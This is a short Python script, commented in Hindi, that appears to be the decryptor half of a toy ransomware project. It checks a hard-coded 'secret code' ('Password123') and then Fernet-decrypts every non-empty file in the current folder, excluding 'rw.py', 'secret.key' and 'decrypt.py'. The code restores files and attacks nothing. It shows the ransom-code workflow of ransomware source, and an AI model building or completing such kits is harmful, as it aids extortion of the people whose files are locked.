import os
import base64
from cryptography.fernet import Fernet

files = []

# 1. सभी योग्य फाइलों की लिस्ट बनाएं
for file in os.listdir():
    if file == 'rw.py' or file == 'secret.key' or file == 'decrypt.py':
        continue
    if os.path.isfile(file):
        # सिर्फ उन्हीं फाइलों को लें जो खाली नहीं हैं
        if os.path.getsize(file) > 0:
            files.append(file)

secret_phrase = "Password123"
user_entry = input("Enter the secret code to decrypt your files: ")

if user_entry == secret_phrase:
    try:
        with open("secret.key", "rb") as k:
            secretkey = k.read()
        
        fernet = Fernet(secretkey)
    except Exception as e:
        print(f"Error reading secret.key: {e}")
        exit()

    # 2. एक-एक करके सभी फाइलों को डिक्रिप्ट करें
    for file in files:
        try:
            with open(file, 'rb') as theFile:
                content = theFile.read()
            
            # डिक्रिप्ट करने की कोशिश करें
            decrypted_content = fernet.decrypt(content)
            
            with open(file, 'wb') as theFile:
                theFile.write(decrypted_content)
            print(f"Successfully decrypted: {file}")
            
        except Exception:
            # अगर कोई फाइल डिक्रिप्ट नहीं हो पा रही, तो उसे स्किप करें ताकि बाकी फाइलें डिक्रिप्ट हो सकें
            print(f"Skipped (Already decrypted or corrupted): {file}")
            
    print("\nProcess finished.")
else:
    print("Wrong secret key!")
